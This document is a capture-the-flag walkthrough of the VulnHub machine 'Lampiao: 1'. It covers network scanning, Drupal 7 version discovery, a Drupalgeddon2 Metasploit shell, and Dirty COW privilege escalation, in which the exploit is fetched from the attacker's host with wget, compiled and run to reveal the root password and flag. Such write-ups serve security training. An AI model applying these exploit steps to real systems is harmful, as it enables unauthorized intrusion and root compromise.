# LAMPIAO: 1

## 1.Get VM IP:
```bash
root@kali: arp-scan -I eth1 -l

Interface: eth1, type: EN10MB, MAC: 00:0c:29:3a:bc:b3, IPv4: 192.168.127.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.127.1   00:50:56:c0:00:01       VMware, Inc.
192.168.127.241 00:0c:29:41:3c:b3       VMware, Inc.
192.168.127.254 00:50:56:e5:26:19       VMware, Inc.
```

The ip address is `192.168.127.241`, let's scan it.

## 2.Enumeration

```bash
root@kali: nmap -sV -sC -p- -v -oN nmap.out 192.168.127.241

Nmap scan report for 192.168.127.241
Host is up (0.0021s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 46:b1:99:60:7d:81:69:3c:ae:1f:c7:ff:c3:66:e3:10 (DSA)
|   2048 f3:e8:88:f2:2d:d0:b2:54:0b:9c:ad:61:33:59:55:93 (RSA)
|   256 ce:63:2a:f7:53:6e:46:e2:ae:81:e3:ff:b7:16:f4:52 (ECDSA)
|_  256 c6:55:ca:07:37:65:e3:06:c1:d6:5b:77:dc:23:df:cc (ED25519)
80/tcp   open  http?
| fingerprint-strings:
|   NULL:
|     _____ _ _
|     |_|/ ___ ___ __ _ ___ _ _
|     \x20| __/ (_| __ \x20|_| |_
|     ___/ __| |___/ ___|__,_|___/__, ( )
|     |___/
|     ______ _ _ _
|     ___(_) | | | |
|     \x20/ _` | / _ / _` | | | |/ _` | |
|_    __,_|__,_|_| |_|
1898/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Lampi\xC3\xA3o
|_http-favicon: Unknown favicon MD5: CF2445DCB53A031C02F9B57E2199BC03
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
|_/LICENSE.txt /MAINTAINERS.txt
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.94%I=7%D=11/11%Time=654F4B57%P=x86_64-pc-linux-gnu%r(NUL
SF:L,1179,"\x20_____\x20_\x20\x20\x20_\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\|_\x20\x20\x20_\|\x20\|\x20\(\
SF:x20\)\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\n\x20\x20\|\x20\|\x20\|\x20\|_\|/\x20___\x20\x20\x20\x20___\x20\x2
SF:0__\x20_\x20___\x20_\x20\x20\x20_\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:n\x20\x20\|\x20\|\x20\|\x20__\|\x20/\x20__\|\x20\x20/\x20_\x20\\/\x20_`
SF:\x20/\x20__\|\x20\|\x20\|\x20\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20_
SF:\|\x20\|_\|\x20\|_\x20\x20\\__\x20\\\x20\|\x20\x20__/\x20\(_\|\x20\\__\
SF:x20\\\x20\|_\|\x20\|_\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\\___/\x20\\__\
SF:|\x20\|___/\x20\x20\\___\|\\__,_\|___/\\__,\x20\(\x20\)\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20__/\x20\|/\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|___/\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\n______\x20_\x20\x20\x20\x20\x20\x20\x20_\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20_\x20\n\|\x20\x20___\(_\)\x20\x20\
SF:x20\x20\x20\|\x20\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|\x20\|\n
SF:\|\x20\|_\x20\x20\x20_\x20\x20\x20\x20__\|\x20\|_\x20\x20\x20_\x20_\x20
SF:__\x20___\x20\x20\x20__\x20_\x20\x20\x20\x20___\x20\x20__\x20_\x20_\x20
SF:\x20\x20_\x20\x20__\x20_\|\x20\|\n\|\x20\x20_\|\x20\|\x20\|\x20\x20/\x2
SF:0_`\x20\|\x20\|\x20\|\x20\|\x20'_\x20`\x20_\x20\\\x20/\x20_`\x20\|\x20\
SF:x20/\x20_\x20\\/\x20_`\x20\|\x20\|\x20\|\x20\|/\x20_`\x20\|\x20\|\n\|\x
SF:20\|\x20\x20\x20\|\x20\|\x20\|\x20\(_\|\x20\|\x20\|_\|\x20\|\x20\|\x20\
SF:|\x20\|\x20\|\x20\|\x20\(_\|\x20\|\x20\|\x20\x20__/\x20\(_\|\x20\|\x20\
SF:|_\|\x20\|\x20\(_\|\x20\|_\|\n\\_\|\x20\x20\x20\|_\|\x20\x20\\__,_\|\\_
SF:_,_\|_\|\x20\|_\|");
MAC Address: 00:0C:29:41:3C:B3 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

There is nothing on port 80, but on port 1898 we have a drupal CMS :

![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/0d03b0e1-6b1b-4b18-bab8-e9fb83ac3fd4)

as what we do first when encountering a CMS is to check the version i just was curious about the version number.

we can see from `robots.txt` that there is a directory `/CHANGELOG.txt` which reveals the version number of this CMS :

![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/75a9b12f-7c07-4ded-974c-071e2a7a4999)

so i just searched for any exploit with this version on the internet and came accross [this](https://www.exploit-db.com/exploits/41564) exploit but it did not work

because we have no `rest_endpoint` or `rest` in web server as it mentions in the code.

so using searchsploit i found another one which suits our situation :

![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/065d5f0f-37de-4019-b386-1b5cd4333e4c)

i used `Drupalgeddon2` from metasploit to get the shell.

## 3.Gaining Shell

In metasploit :

![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/e6e85c62-d67e-4771-a186-e5449f3c1cbe)

use `exploit/unix/webapp/drupal_drupalgeddon2` and you will get the shell :

![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/0ca7fd90-88af-4caf-851d-85e8ebbd39e2)

yes, we got the shell

## 4.Privilege Escalation

Now we just check the kernel version and find any exploit for it :

![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/fcf13d1b-a184-48f4-9e75-7b63087a6af7)


use `linux-exploit-suggester.sh` to find any exploit for this kernel :

![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/593d1aad-9d5a-4ace-a9c6-6666acf43d74)


download dirycow 2 exploit and compile it on the server :

```bash
root@kali: searchsploit -m https://www.exploit-db.com/download/40847
root@kali: python3 -m http.server 80

www-data@lampiao:/tmp$ wget http://192.168.127.128/40847.cpp

www-data@lampiao:/tmp$ g++ -Wall -pedantic -O2 -std=c++11 -pthread -o output 40847.cpp -lutil
www-data@lampiao:/tmp$ ./output
Running ...
Received su prompt (Password: )
Root password is:   dirtyCowFun
Enjoy! :-)

www-data@lampiao:/tmp$ su root
su root
Password: dirtyCowFun

root@lampiao:/tmp# cd /root

root@lampiao:~# cat flag.txt
cat flag.txt
9740616875908d91ddcdaa8aea3af366
```

this is how you can get root on this machine :)







